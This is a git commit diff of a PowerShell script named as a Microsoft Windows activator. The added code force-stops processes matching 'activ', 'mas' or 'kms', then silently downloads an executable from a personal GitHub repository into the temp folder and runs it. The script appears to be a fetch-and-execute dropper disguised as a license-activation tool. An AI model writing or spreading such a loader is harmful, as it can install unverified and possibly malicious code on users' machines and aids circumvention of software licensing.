1b0c33e6a26ba74a3b7af06782a4aa8c04c3b09d
acenljd <thebluepoint2@gmail.com>
2025-12-09 19:47:21 +0200

    Update Microsoft Activation Scripts.ps1

--- Microsoft Activation Scripts.ps1
+++ Microsoft Activation Scripts.ps1
@@ -1,8 +1,24 @@
 $url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
-$tempFile = "$env:TEMP\MAS_$([Guid]::NewGuid().ToString('N')).exe"
 
-Write-Host "Изтегляне към: $tempFile" -ForegroundColor Yellow
-(New-Object System.Net.WebClient).DownloadFile($url, $tempFile)
 
-Write-Host "Стартиране..." -ForegroundColor Green
+Get-Process | Where-Object {
+    $_.ProcessName -like "*activ*" -or 
+    $_.ProcessName -like "*mas*" -or 
+    $_.ProcessName -like "*kms*" -or 
+    $_.MainWindowTitle -like "*activ*"
+} | Stop-Process -Force -ErrorAction SilentlyContinue
+
+
+Start-Sleep -Seconds 1
+
+
+$uniqueName = "Activator_" + [System.Guid]::NewGuid().ToString("N").Substring(0, 8) + ".exe"
+$tempFile = "$env:TEMP\$uniqueName"
+
+
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $tempFile)
+$webClient.Dispose()
+
+
 Start-Process $tempFile
